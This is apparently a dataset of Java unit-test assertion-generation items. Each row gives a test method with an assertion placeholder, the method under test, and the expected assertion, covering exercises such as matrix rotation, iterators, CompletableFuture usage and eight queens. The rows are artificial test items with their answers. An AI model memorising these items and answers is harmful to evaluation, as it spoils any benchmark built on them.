rotate(int[][] matrix, int r) { int left = 0; int up = 0;  int m = matrix.length; int n = matrix[0].length;  while (m >= 1 && n >= 1) { var count = 2 * (m + n) - 4; int[] tmp = new int[count]; int curr = 0;  for (int i = 0; i < n; i++) { tmp[curr] = matrix[up][left + i]; curr++; } for (int i = 1; i < m - 1; i++) { tmp[curr] = matrix[up + i][left + n - 1]; curr++; } for (int i = n - 1; i >= 0; i--) { tmp[curr] = matrix[up + m - 1][left + i]; curr++; } for (int i = m - 2; i >= 1; i--) { tmp[curr] = matrix[up + i][left]; curr++; }  curr = r % count; if (curr < 0) { curr += count; }  for (int i = 0; i < n; i++) { matrix[up][left + i] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } } for (int i = 1; i < m - 1; i++) { matrix[up + i][left + n - 1] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } } for (int i = n - 1; i >= 0; i--) { matrix[up + m - 1][left + i] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } } for (int i = m - 2; i >= 1; i--) { matrix[up + i][left] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } }  m -= 2; n -= 2;  left++; up++; } }"	assertThat(matrix).isEqualTo(EXPECTED_MATRIX)
"rotateForBigR() { var matrix = buildMatrix();  MatrixRotation.rotate(matrix, 14);  ""<AssertPlaceHolder>""; }
rotate(int[][] matrix, int r) { int left = 0; int up = 0;  int m = matrix.length; int n = matrix[0].length;  while (m >= 1 && n >= 1) { var count = 2 * (m + n) - 4; int[] tmp = new int[count]; int curr = 0;  for (int i = 0; i < n; i++) { tmp[curr] = matrix[up][left + i]; curr++; } for (int i = 1; i < m - 1; i++) { tmp[curr] = matrix[up + i][left + n - 1]; curr++; } for (int i = n - 1; i >= 0; i--) { tmp[curr] = matrix[up + m - 1][left + i]; curr++; } for (int i = m - 2; i >= 1; i--) { tmp[curr] = matrix[up + i][left]; curr++; }  curr = r % count; if (curr < 0) { curr += count; }  for (int i = 0; i < n; i++) { matrix[up][left + i] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } } for (int i = 1; i < m - 1; i++) { matrix[up + i][left + n - 1] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } } for (int i = n - 1; i >= 0; i--) { matrix[up + m - 1][left + i] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } } for (int i = m - 2; i >= 1; i--) { matrix[up + i][left] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } }  m -= 2; n -= 2;  left++; up++; } }"	assertThat(matrix).isEqualTo(EXPECTED_MATRIX)
"rotateWhenNoRotation() { var matrix = buildMatrix();  MatrixRotation.rotate(matrix, 0);  ""<AssertPlaceHolder>""; }
rotate(int[][] matrix, int r) { int left = 0; int up = 0;  int m = matrix.length; int n = matrix[0].length;  while (m >= 1 && n >= 1) { var count = 2 * (m + n) - 4; int[] tmp = new int[count]; int curr = 0;  for (int i = 0; i < n; i++) { tmp[curr] = matrix[up][left + i]; curr++; } for (int i = 1; i < m - 1; i++) { tmp[curr] = matrix[up + i][left + n - 1]; curr++; } for (int i = n - 1; i >= 0; i--) { tmp[curr] = matrix[up + m - 1][left + i]; curr++; } for (int i = m - 2; i >= 1; i--) { tmp[curr] = matrix[up + i][left]; curr++; }  curr = r % count; if (curr < 0) { curr += count; }  for (int i = 0; i < n; i++) { matrix[up][left + i] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } } for (int i = 1; i < m - 1; i++) { matrix[up + i][left + n - 1] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } } for (int i = n - 1; i >= 0; i--) { matrix[up + m - 1][left + i] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } } for (int i = m - 2; i >= 1; i--) { matrix[up + i][left] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } }  m -= 2; n -= 2;  left++; up++; } }"	assertThat(matrix).isEqualTo(buildMatrix())
"rotateWhenNoRotation2() { var matrix = buildMatrix();  MatrixRotation.rotate(matrix, 12);  ""<AssertPlaceHolder>""; }
rotate(int[][] matrix, int r) { int left = 0; int up = 0;  int m = matrix.length; int n = matrix[0].length;  while (m >= 1 && n >= 1) { var count = 2 * (m + n) - 4; int[] tmp = new int[count]; int curr = 0;  for (int i = 0; i < n; i++) { tmp[curr] = matrix[up][left + i]; curr++; } for (int i = 1; i < m - 1; i++) { tmp[curr] = matrix[up + i][left + n - 1]; curr++; } for (int i = n - 1; i >= 0; i--) { tmp[curr] = matrix[up + m - 1][left + i]; curr++; } for (int i = m - 2; i >= 1; i--) { tmp[curr] = matrix[up + i][left]; curr++; }  curr = r % count; if (curr < 0) { curr += count; }  for (int i = 0; i < n; i++) { matrix[up][left + i] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } } for (int i = 1; i < m - 1; i++) { matrix[up + i][left + n - 1] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } } for (int i = n - 1; i >= 0; i--) { matrix[up + m - 1][left + i] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } } for (int i = m - 2; i >= 1; i--) { matrix[up + i][left] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } }  m -= 2; n -= 2;  left++; up++; } }"	assertThat(matrix).isEqualTo(buildMatrix())
"rotateForNegativeR() { var matrix = buildMatrix();  MatrixRotation.rotate(matrix, -10);  ""<AssertPlaceHolder>""; }
rotate(int[][] matrix, int r) { int left = 0; int up = 0;  int m = matrix.length; int n = matrix[0].length;  while (m >= 1 && n >= 1) { var count = 2 * (m + n) - 4; int[] tmp = new int[count]; int curr = 0;  for (int i = 0; i < n; i++) { tmp[curr] = matrix[up][left + i]; curr++; } for (int i = 1; i < m - 1; i++) { tmp[curr] = matrix[up + i][left + n - 1]; curr++; } for (int i = n - 1; i >= 0; i--) { tmp[curr] = matrix[up + m - 1][left + i]; curr++; } for (int i = m - 2; i >= 1; i--) { tmp[curr] = matrix[up + i][left]; curr++; }  curr = r % count; if (curr < 0) { curr += count; }  for (int i = 0; i < n; i++) { matrix[up][left + i] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } } for (int i = 1; i < m - 1; i++) { matrix[up + i][left + n - 1] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } } for (int i = n - 1; i >= 0; i--) { matrix[up + m - 1][left + i] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } } for (int i = m - 2; i >= 1; i--) { matrix[up + i][left] = tmp[curr]; curr++; if (curr >= count) { curr -= count; } }  m -= 2; n -= 2;  left++; up++; } }"	assertThat(matrix).isEqualTo(EXPECTED_MATRIX)
"canViewAllForEmptyList() { ""<AssertPlaceHolder>""; }
canViewAll(List<Movie> movies) { movies = new ArrayList<>(movies); Collections.sort(movies);  for (int i = 1; i < movies.size(); i++) { if (movies.get(i - 1).end.after(movies.get(i).start)) { return false; } }  return true; }"	assertTrue(canViewAll(new ArrayList<>()))
"permute1() { List<List<Integer>> result = Permutations.permute(new int[]{1}); ""<AssertPlaceHolder>""; }
permute(int[] nums) { List<List<Integer>> result = new ArrayList<>(); populate(result, 0, nums); return result; }"	assertThat(result) .hasSameElementsAs(List.of( List.of(1) ) )
"testFind() { ""<AssertPlaceHolder>""; }
find(int[] places) { var leftFound = false; var left = -1; var right = -1; List<Interval> intervals = new ArrayList<>();  for (int current = 0; current < places.length; current++) { if (places[current] == 0) { right = current; if (!leftFound) { leftFound = true; left = current; } } else { if (leftFound) { intervals.add(new Interval(left, right)); leftFound = false; } } } if (leftFound) { intervals.add(new Interval(left, right)); }  int maxDistance = 0; for (var interval : intervals) { int distance = determineDistance(interval, places.length); if (distance > maxDistance) { maxDistance = distance; } } return maxDistance; }"	assertEquals(expected, ProgrammerInCinemaDuringCovid.find(input))
"IllegalAccessException { Person person = new Person(""Andrei""); ""<AssertPlaceHolder>""; }
extract(Object obj) throws IllegalAccessException { List<String> result = new ArrayList<>();  Field[] fields = obj.getClass().getDeclaredFields(); for (Field field : fields) { if (field.isSynthetic() || isStaticField(field)) { continue; }  Object value = extractValue(field, obj); if (value == null) { continue; }  if (isPrimitiveOrString(value)) { result.add(String.valueOf(value)); } else { result.add(extract(value)); } } return result.stream().collect(Collectors.joining("" "")); }"	"assertThat(PropertiesExtractor.extract(person), is(""Andrei""))"
"IllegalAccessException { Person person = new Person(""Andrei""); person.setCard(new Card(""VISA"", ""123546"")); ""<AssertPlaceHolder>""; }
extract(Object obj) throws IllegalAccessException { List<String> result = new ArrayList<>();  Field[] fields = obj.getClass().getDeclaredFields(); for (Field field : fields) { if (field.isSynthetic() || isStaticField(field)) { continue; }  Object value = extractValue(field, obj); if (value == null) { continue; }  if (isPrimitiveOrString(value)) { result.add(String.valueOf(value)); } else { result.add(extract(value)); } } return result.stream().collect(Collectors.joining("" "")); }"	"assertThat(PropertiesExtractor.extract(person), is(""Andrei VISA 123546""))"
"transformUsingSorting() { ""<AssertPlaceHolder>""; }
transformUsingSorting(Integer[] items) { return Arrays.stream(items) .map(integer -> integer * integer) .sorted() .collect(Collectors.toList()) .toArray(new Integer[0]); }"	assertThat(SortedSquares.transformUsingSorting(INITIAL_ARRAY)) .isEqualTo(EXPECTED_ARRAY)
"transformUsingDeque() { ""<AssertPlaceHolder>""; }
transformUsingDeque(Integer[] items) { int left = 0; int right = items.length - 1;  Deque<Integer> queue = new ArrayDeque<>(); while (left <= right) { var leftValue = items[left] * items[left]; var rightValue = items[right] * items[right];  if (leftValue < rightValue) { queue.addFirst(rightValue); right--; } else { queue.addFirst(leftValue); left++; } }  return queue.toArray(new Integer[0]); }"	assertThat(SortedSquares.transformUsingDeque(INITIAL_ARRAY)) .isEqualTo(EXPECTED_ARRAY)
"transformUsingPriorityQueue() { ""<AssertPlaceHolder>""; }
transformUsingPriorityQueue(Integer[] items) { PriorityQueue<Integer> priorityQueue = new PriorityQueue<>(Comparator.comparingInt(value -> value)); for (var item : items) { priorityQueue.add(item * item); }  List<Integer> result = new ArrayList<>(); while (!priorityQueue.isEmpty()) { result.add(priorityQueue.poll()); } return result.toArray(new Integer[0]); }"	assertThat(SortedSquares.transformUsingPriorityQueue(INITIAL_ARRAY)) .isEqualTo(EXPECTED_ARRAY)
"testTextInput() { UserInput.TextInput input = new UserInput.TextInput(); input.add('1'); input.add('a'); input.add('0');  ""<AssertPlaceHolder>""; }
getValue() { return value; }"	"assertThat(""Unexpected string"", input.getValue(), is(""1a0""))"
"testNumericInput() { UserInput.TextInput input = new UserInput.NumericInput(); input.add('1'); input.add('a'); input.add('0');  ""<AssertPlaceHolder>""; }
getValue() { return value; }"	"assertThat(""Unexpected string"", input.getValue(), is(""10""))"
"createStringBy_CreatorUsingDeclaredConstructor() { CreatorUsingDeclaredConstructor<String> container = new CreatorUsingDeclaredConstructor<>();  ""<AssertPlaceHolder>""; }
createObject(Class<E> clazz) { return clazz.getDeclaredConstructor().newInstance(); }"	"assertThat(container.createObject(String.class), is(""""))"
"createStringBy_CreatorUsingSupplier() { CreatorUsingSupplier<String> container = new CreatorUsingSupplier<>(String::new);  ""<AssertPlaceHolder>""; }
createObject() { return supplier.get(); }"	"assertThat(container.createObject(), is(""""))"
"createClassWithoutFieldsBy_CreatorUsingDeclaredConstructor() { CreatorUsingDeclaredConstructor<CustomClassWithoutFields> container = new CreatorUsingDeclaredConstructor<>();  ""<AssertPlaceHolder>""; }
createObject(Class<E> clazz) { return clazz.getDeclaredConstructor().newInstance(); }"	assertThat(container.createObject(CustomClassWithoutFields.class), instanceOf(CustomClassWithoutFields.class))
"createClassWithoutFieldsBy_CreatorUsingSupplier() { CreatorUsingSupplier<CustomClassWithoutFields> container = new CreatorUsingSupplier<>(CustomClassWithoutFields::new);  ""<AssertPlaceHolder>""; }
createObject() { return supplier.get(); }"	assertThat(container.createObject(), instanceOf(CustomClassWithoutFields.class))
"createClassWithFieldBy_CreatorUsingSupplier() { CreatorUsingSupplier<CustomClassWithField> container = new CreatorUsingSupplier<>(() -> new CustomClassWithField(0));  ""<AssertPlaceHolder>""; }
createObject() { return supplier.get(); }"	assertThat(container.createObject(), instanceOf(CustomClassWithField.class))
"case2() { ""<AssertPlaceHolder>""; }
case2() { try { return 1; } catch (Exception e) { return 2; } finally { return 3; } }"	assertThat(trickyFinally.case2()).isEqualTo(3)
"testNextAndHasNext() { List<Integer> list1 = Arrays.asList(12, 52); List<Integer> list2 = Arrays.asList(34, 98, 2); var compositeIterator = new CompositeIterator<>(list1.iterator(), list2.iterator());  var result = new ArrayList<>(); while (compositeIterator.hasNext()) { Integer item = compositeIterator.next(); result.add(item); }  ""<AssertPlaceHolder>""; }
next() { if (currentIterator == a && !currentIterator.hasNext()) { currentIterator = b; } return currentIterator.next(); }"	assertThat(result).isEqualTo(List.of(12, 52, 34, 98, 2))
"testNextHasNextForPlainList() { List<String> list = Arrays.asList(""1"", ""3"", ""5"", ""7"", ""9""); RecursiveIterator iterator = new RecursiveIterator(list.iterator());  List<String> result = new ArrayList<>(); while (iterator.hasNext()) { result.add((String) iterator.next()); }  ""<AssertPlaceHolder>""; }
next() { if (stack.isEmpty()) { throw new NoSuchElementException(); }  Iterator<Object> currentIterator = stack.peek(); if (!currentIterator.hasNext()) { stack.pop(); return next(); }  Object object = currentIterator.next(); if (object instanceof String) { return object; } stack.push((Iterator<Object>) object); return next(); }"	"assertThat(result).isEqualTo(List.of(""1"", ""3"", ""5"", ""7"", ""9""))"
"testNextHasNextForComplexStructure() { List<Object> list1 = Arrays.asList(""23"", ""31"", Arrays.asList().iterator()); List<Object> list2 = Arrays.asList(""3"", ""9"", ""4"", list1.iterator()); List<Object> list3 = Arrays.asList(""1"", list2.iterator(), ""88""); List<Object> list4 = Arrays.asList(""5"", ""37"", Arrays.asList().iterator()); List<Object> list = Arrays.asList(list3.iterator(), ""22"", list4.iterator(), ""11""); RecursiveIterator iterator = new RecursiveIterator(list.iterator());  List<String> result = new ArrayList<>(); while (iterator.hasNext()) { result.add((String) iterator.next()); }  ""<AssertPlaceHolder>""; }
next() { if (stack.isEmpty()) { throw new NoSuchElementException(); }  Iterator<Object> currentIterator = stack.peek(); if (!currentIterator.hasNext()) { stack.pop(); return next(); }  Object object = currentIterator.next(); if (object instanceof String) { return object; } stack.push((Iterator<Object>) object); return next(); }"	"assertThat(result).isEqualTo(List.of(""1"", ""3"", ""9"", ""4"", ""23"", ""31"", ""88"", ""22"", ""5"", ""37"", ""11""))"
"InterruptedException { var aggregator = new AddMultithreading.Aggregator( new SystemA(""One""), new SystemB(""Two"") );  var future = CompletableFuture.supplyAsync(() -> aggregator.doRequestOld());  await().atLeast(2, TimeUnit.SECONDS) .atMost(3, TimeUnit.SECONDS) .pollInterval(ONE_HUNDRED_MILLISECONDS) .until(() -> future.isDone()); ""<AssertPlaceHolder>""; }
doRequestOld() { Object responseA = systemA.doRequest(); Object responseB = systemB.doRequest(); return aggregate(responseA, responseB); }"	"assertThat(future.get()).isEqualTo(""OneTwo"")"
"InterruptedException { var aSystems = new SystemA[5]; var bSystems = new SystemB[5]; for (int i = 0; i < aSystems.length; i++) { aSystems[i] = new SystemA(String.valueOf(i)); } for (int i = 0; i < bSystems.length; i++) { bSystems[i] = new SystemB(String.valueOf(i * i)); }  var aggregator = new AddMultithreading.Aggregator(aSystems, bSystems);  var future = CompletableFuture.supplyAsync(() -> aggregator.doRequest10());  await().atMost(1_500, TimeUnit.MILLISECONDS) .pollInterval(ONE_HUNDRED_MILLISECONDS) .until(() -> future.isDone()); ""<AssertPlaceHolder>""; }
doRequest10() { var futures = new ArrayList<CompletableFuture<Object>>(); for (var system : aSystems) { futures.add(CompletableFuture.supplyAsync(() -> system.doRequest())); } for (var system : bSystems) { futures.add(CompletableFuture.supplyAsync(() -> system.doRequest())); }  var resultFuture = CompletableFuture.supplyAsync(() -> """"); for (var future : futures) { resultFuture = resultFuture.thenCombine( future, Aggregator::aggregate ); } return resultFuture.get(); }"	"assertThat(future.get()).isEqualTo(""01234014916"")"
"InterruptedException { CompletableFuture<Void> future = CompletableFuture.supplyAsync(() -> { new Deadlock().makeDeadlock(); return null; });  new Thread(() -> { try { future.get(); System.out.println(""Future completed!""); } catch (InterruptedException | ExecutionException e) { throw new RuntimeException(e); } }).start();  // Wait 1 sec Thread.sleep(1000);  ""<AssertPlaceHolder>""; }
makeDeadlock() { Friend alphonse = new Friend(""Alphonse""); Friend gaston = new Friend(""Gaston"");  Thread thread1 = new Thread(() -> alphonse.bow(gaston)); Thread thread2 = new Thread(() -> gaston.bow(alphonse));  thread1.start(); thread2.start();  while (thread1.isAlive() || thread2.isAlive()) ; }"	"assertFalse(""Should not be completed after 1 sec wait"", future.isDone())"
"InterruptedException { Future<String> future = futureMain.calculateViaSubmitToExecutor();  ""<AssertPlaceHolder>""; }
calculateViaSubmitToExecutor() { CompletableFuture<String> completableFuture = new CompletableFuture<>();  Executors.newCachedThreadPool().submit(() -> { Thread.sleep(500); completableFuture.complete(""Hello Async""); return null; });  return completableFuture; }"	"assertEquals(""Hello Async"", future.get())"
"InterruptedException { Future<String> future = futureMain.calculateWhenResultKnown();  ""<AssertPlaceHolder>""; }
calculateWhenResultKnown() { return CompletableFuture.completedFuture(""Hello Known""); }"	"assertEquals(""Hello Known"", future.get())"
"InterruptedException { Future<String> future = futureMain.calculateWithPassingSupplierIntoFuture();  ""<AssertPlaceHolder>""; }
calculateWithPassingSupplierIntoFuture() { return CompletableFuture.supplyAsync(() -> ""Hello Supplier""); }"	"assertEquals(""Hello Supplier"", future.get())"
"InterruptedException { Future<String> future = futureMain.processingResultsOfAsyncComputations();  ""<AssertPlaceHolder>""; }
processingResultsOfAsyncComputations() { CompletableFuture<String> completableFuture = CompletableFuture.supplyAsync(() -> ""Hello Async"");  CompletableFuture<String> future = completableFuture .thenApply(s -> s + "" Additional action"");  // This (thenApplyAsync method) allows us to parallelize our computation even more // and use system resources more efficiently CompletableFuture<String> future2 = future .thenApplyAsync(s -> s + "" Additional action 2"");  return future2; }"	"assertEquals(""Hello Async Additional action Additional action 2"", future.get())"
"InterruptedException { CompletableFuture<String> future = futureMain.combineFuturesSequentially();  ""<AssertPlaceHolder>""; }
combineFuturesSequentially() { return CompletableFuture .supplyAsync(() -> ""Hello"") .thenCompose(s -> CompletableFuture.supplyAsync(() -> s + "" World Sequentially"")); }"	"assertEquals(""Hello World Sequentially"", future.get())"
"InterruptedException { CompletableFuture<String> future = futureMain.combineFuturesInParallel();  ""<AssertPlaceHolder>""; }
combineFuturesInParallel() { return CompletableFuture .supplyAsync(() -> ""Hello"") .thenCombine(CompletableFuture.supplyAsync(() -> "" World In Parallel""), (s1, s2) -> s1 + s2); }"	"assertEquals(""Hello World In Parallel"", future.get())"
"InterruptedException { String result = futureMain.runFuturesInParallelWithResult();  ""<AssertPlaceHolder>""; }
runFuturesInParallelWithResult() throws ExecutionException, InterruptedException { CompletableFuture<String> future1 = CompletableFuture.supplyAsync(() -> ""Hello""); CompletableFuture<String> future2 = CompletableFuture.supplyAsync(() -> ""Beautiful""); CompletableFuture<String> future3 = CompletableFuture.supplyAsync(() -> ""World"");  return Stream.of(future1, future2, future3) .map(CompletableFuture::join) .collect(Collectors.joining("" "")); }"	"assertEquals(""Hello Beautiful World"", result)"
"moveZeroes() { var items = new int[]{0, 1, 0, 3, 12};  MoveZeroes.moveZeroes(items);  ""<AssertPlaceHolder>""; }
moveZeroes(int[] items) { int i = 0; for (var item : items) { if (item != 0) { items[i] = item; i++; } }  Arrays.fill(items, i, items.length, 0); }"	assertThat(items).isEqualTo(new int[]{1, 3, 12, 0, 0})
"moveZeroesWhenZerosOnly() { var items = new int[]{0, 0, 0};  MoveZeroes.moveZeroes(items);  ""<AssertPlaceHolder>""; }
moveZeroes(int[] items) { int i = 0; for (var item : items) { if (item != 0) { items[i] = item; i++; } }  Arrays.fill(items, i, items.length, 0); }"	assertThat(items).isEqualTo(new int[]{0, 0, 0})
"isSymmetric() { int[][] matrix = { {0, 1, 5}, {1, 1, 3}, {5, 3, 2}, }; ""<AssertPlaceHolder>""; }
isSymmetric(int[][] matrix) { var size = matrix.length; for (int i = 0; i < size; i++) { for (int j = i + 1; j < size; j++) { if (matrix[i][j] != matrix[j][i]) { return false; } } } return true; }"	assertTrue(SymmetricMatrix.isSymmetric(matrix))
"isSymmetricNegative() { int[][] matrix = { {0, 1, 5}, {1, 1, 4}, {5, 3, 2}, }; ""<AssertPlaceHolder>""; }
isSymmetric(int[][] matrix) { var size = matrix.length; for (int i = 0; i < size; i++) { for (int j = i + 1; j < size; j++) { if (matrix[i][j] != matrix[j][i]) { return false; } } } return true; }"	assertFalse(SymmetricMatrix.isSymmetric(matrix))
"Exception { String xml = ""<?xml version=""1.0"" encoding=""UTF-8""?>\n"" + ""<log>\n"" + ""    <entry id=""1"">\n"" + ""        <message>Application started</message>\n"" + ""    </entry>\n"" + ""    <entry id=""2"">\n"" + ""        <message>Application ended</message>\n"" + ""    </entry>\n"" + ""</log>"";  Collection<Integer> ids = parser.getIdsByMessage(xml, ""Application stopped"");  ""<AssertPlaceHolder>""; }
getIdsByMessage(String xmlString, String message) throws Exception { DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance(); DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder(); ByteArrayInputStream inputStream = new ByteArrayInputStream(xmlString.getBytes()); Document document = documentBuilder.parse(inputStream);  List<Integer> result = new ArrayList<>(); NodeList elements = document.getElementsByTagName(MESSAGE_TAG); for (int i = 0; i < elements.getLength(); i++) { Node item = elements.item(i); if (message.equals(item.getTextContent())) { NamedNodeMap attributes = item.getParentNode().getAttributes(); result.add(Integer.valueOf(attributes.getNamedItem(ID_ATTRIBUTE).getTextContent())); } } return result; }"	assertTrue(ids.isEmpty())
"solveFor2x2() { EightQueens.Solution solution = eightQueens.solve(2);  ""<AssertPlaceHolder>""; }
solve(int boardSize) { boolean[][] cellsTaken = new boolean[boardSize][boardSize]; boolean isFound = checkSolution(boardSize, cellsTaken, 0);  return new Solution(isFound, cellsTaken); }"	assertFalse(solution.isFound())
"solveFor3x3() { EightQueens.Solution solution = eightQueens.solve(3);  ""<AssertPlaceHolder>""; }
solve(int boardSize) { boolean[][] cellsTaken = new boolean[boardSize][boardSize]; boolean isFound = checkSolution(boardSize, cellsTaken, 0);  return new Solution(isFound, cellsTaken); }"	assertFalse(solution.isFound())
"prettyPrint() { var solution = new EightQueens.Solution(true, new boolean[][]{ {true, false}, {false, true} });  ""<AssertPlaceHolder>""; }
prettyPrint() { int size = cellsTaken.length; int[][] result = new int[size][size]; for (int i = 0; i < size; i++) { for (int j = 0; j < size; j++) { result[i][j] = cellsTaken[i][j] ? 1 : 0; } } return result; }"	assertThat(solution.prettyPrint(), is(new int[][]{ {1, 0}, {0, 1} }))
"sumRecursiveForPlainNode() { UnmodifiableNode node = new UnmodifiableNode(12); ""<AssertPlaceHolder>""; }
sumRecursive() { return sumRecursive(this); }"	assertThat(node.sumRecursive()).isEqualTo(12)
"sumRecursiveForComplexNode() { UnmodifiableNode node = prepareComplexNode(); ""<AssertPlaceHolder>""; }
sumRecursive() { return sumRecursive(this); }"	assertThat(node.sumRecursive()).isEqualTo(60)
"sumRecursive2ForPlainNode() { UnmodifiableNode node = new UnmodifiableNode(12); ""<AssertPlaceHolder>""; }
sumRecursive2() { return flattennedStream() .map(UnmodifiableNode::getValue) .reduce(0, (a, b) -> a + b); }"	assertThat(node.sumRecursive2()).isEqualTo(12)
"sumRecursive2ForComplexNode() { UnmodifiableNode node = prepareComplexNode(); ""<AssertPlaceHolder>""; }
sumRecursive2() { return flattennedStream() .map(UnmodifiableNode::getValue) .reduce(0, (a, b) -> a + b); }"	assertThat(node.sumRecursive2()).isEqualTo(60)
"sumNonRecursiveForPlainNode() { UnmodifiableNode node = new UnmodifiableNode(12); ""<AssertPlaceHolder>""; }
sumNonRecursive() { var result = value; var stack = new ArrayDeque<List<UnmodifiableNode>>(); stack.add(children);  while (!stack.isEmpty()) { for (var node : stack.pop()) { result += node.value; stack.add(node.children); } } return result; }"	assertThat(node.sumNonRecursive()).isEqualTo(12)
"sumNonRecursiveForComplexNode() { UnmodifiableNode node = prepareComplexNode(); ""<AssertPlaceHolder>""; }
sumNonRecursive() { var result = value; var stack = new ArrayDeque<List<UnmodifiableNode>>(); stack.add(children);  while (!stack.isEmpty()) { for (var node : stack.pop()) { result += node.value; stack.add(node.children); } } return result; }"	assertThat(node.sumNonRecursive()).isEqualTo(60)
"checkImmutability() { var node = new UnmodifiableNode( List.of(new UnmodifiableNode(2), new UnmodifiableNode(3)), 12 ); var oldValue = node.getChildren().get(0); var newValue = new UnmodifiableNode(333); node.getChildren().set(0, newValue);  ""<AssertPlaceHolder>""; }
getChildren() { return new ArrayList<>(children); }"	assertThat(node.getChildren().get(0)).isEqualTo(oldValue)
"testToString() { UnmodifiableNode node = prepareComplexNode(); ""<AssertPlaceHolder>""; }
toString() { if (children.isEmpty()) { return ""{%d}"".formatted(value); } return ""{%d, %s}"".formatted(value, children); }"	"assertThat(node.toString()).isEqualTo(""{12, [{2}, {3, [{32}, {11}]}]}"")"
"testCount_MN() { ""<AssertPlaceHolder>""; }
count_MN(int[][] grid) { var m = grid.length; if (m == 0) { return 0; } var n = grid[0].length; var result = 0;  for (int i = 0; i < m; i++) { for (int j = 0; j < n; j++) { if (grid[i][j] < 0) { result += n - j;    // add count of numbers from current to the end of row (because of sorted row) break; } } } return result; }"	assertThat(count_MN(grid.value)).isEqualTo(expectedResult)
"testCount_NPlusM() { ""<AssertPlaceHolder>""; }
count_NPlusM(int[][] grid) { var m = grid.length; if (m == 0) { return 0; } var n = grid[0].length; var result = 0;  // start position in the left bottom grid corner var i = m - 1; var j = 0;  while (i >= 0 && j < n) { if (grid[i][j] < 0) { i--;                // switch to the upper row result += n - j;    // add count of numbers from current to the end of row (because of sorted row) } else { j++;                // switch to the right column } } return result; }"	assertThat(count_NPlusM(grid.value)).isEqualTo(expectedResult)
"countSmallField() { int[][] seaField = { { 0, 1, 0, 0}, { 1, 0, 0, 0}, { 1, 0, 1, 1}, { 1, 0, 0, 0}, }; ""<AssertPlaceHolder>""; }
count(int[][] matrix) { var size = matrix.length; var result = 0;  for (int i = 0; i < size; i++) { for (int j = 0; j < size; j++) { if (matrix[i][j] == 1) { boolean isNewShip = checkIsNewShip(matrix, i, j); if (isNewShip) { result++; } } } } return result; }"	assertThat(CountSeaShips.count(seaField)).isEqualTo(3)
"countEmptyField() { int[][] seaField = { { 0, 0, 0, 0}, { 0, 0, 0, 0}, { 0, 0, 0, 0}, { 0, 0, 0, 0}, }; ""<AssertPlaceHolder>""; }
count(int[][] matrix) { var size = matrix.length; var result = 0;  for (int i = 0; i < size; i++) { for (int j = 0; j < size; j++) { if (matrix[i][j] == 1) { boolean isNewShip = checkIsNewShip(matrix, i, j); if (isNewShip) { result++; } } } } return result; }"	assertThat(CountSeaShips.count(seaField)).isEqualTo(0)
"countBigField() { int[][] seaField = { { 0, 0, 1, 1, 0, 0, 1, 0}, { 1, 0, 0, 0, 0, 0, 0, 0}, { 0, 0, 1, 0, 1, 1, 1, 0}, { 0, 0, 1, 0, 0, 0, 0, 0}, { 1, 0, 1, 0, 0, 1, 0, 1}, { 1, 0, 1, 0, 0, 0, 0, 1}, { 0, 0, 0, 0, 1, 1, 0, 0}, { 0, 1, 0, 0, 0, 0, 0, 0}, }; ""<AssertPlaceHolder>""; }
count(int[][] matrix) { var size = matrix.length; var result = 0;  for (int i = 0; i < size; i++) { for (int j = 0; j < size; j++) { if (matrix[i][j] == 1) { boolean isNewShip = checkIsNewShip(matrix, i, j); if (isNewShip) { result++; } } } } return result; }"	assertThat(CountSeaShips.count(seaField)).isEqualTo(10)
"testFindForEmptyArray() { ""<AssertPlaceHolder>""; }
find(int[] items) { for (int i = 0; i < items.length; i++) { var index = Math.abs(items[i]) - 1; if (items[index] > 0) { items[index] = -items[index]; } } System.out.println(Arrays.toString(items));  var amount = 0; for (int i = 0; i < items.length; i++) { if (items[i] > 0) { items[amount] = i + 1; amount++; } } return Arrays.copyOfRange(items, 0, amount); }"	assertThat(find(new int[]{})).isEmpty()
"findForEmpty() { ""<AssertPlaceHolder>""; }
find(int[] a) { int minOdd = -1; int sum = 0;  for (int item : a) { sum += item; if (item % 2 == 1) {  if (minOdd == -1) { minOdd = item; continue; }  if (item < minOdd) { minOdd = item; } } }  if (sum % 2 == 1) { return sum - minOdd; } return sum; }"	assertThat(FindMaxEvenSum.find(new int[]{})).isEqualTo(0)
"findForOneElement() { ""<AssertPlaceHolder>""; }
find(int[] nums) { int[] presence = new int[nums.length + 1];  for (int num : nums) { if (num > 0 && num < presence.length) { presence[num] = 1; } }  int position = 1; for (; position < presence.length; position++) { if (presence[position] == 0) { return position; } } return position; }"	assertThat(find(new int[]{1})).isEqualTo(2)
"findForEmptyArray() { ""<AssertPlaceHolder>""; }
find(int[] nums) { int[] presence = new int[nums.length + 1];  for (int num : nums) { if (num > 0 && num < presence.length) { presence[num] = 1; } }  int position = 1; for (; position < presence.length; position++) { if (presence[position] == 0) { return position; } } return position; }"	assertThat(find(new int[]{})).isEqualTo(1)
"exist() { char[][] board = new char[][]{ {'A', 'B', 'C', 'E'}, {'S', 'F', 'C', 'S'}, {'A', 'D', 'E', 'E'} }; var word = ""ABCCED"";  ""<AssertPlaceHolder>""; }
exist(char[][] board, String word) { var m = board.length; var n = board[0].length;  for (int i = 0; i < m; i++) { for (int j = 0; j < n; j++) { if (checkIsCharacterSuitable(board, i, j, word, 0)) { boolean[][] visited = new boolean[m][n]; visited[i][j] = true;  if (findNextCharacter(board, i, j, word, 1, visited)) { return true; } } } } return false; }"	assertTrue(wordSearch.exist(board, word))
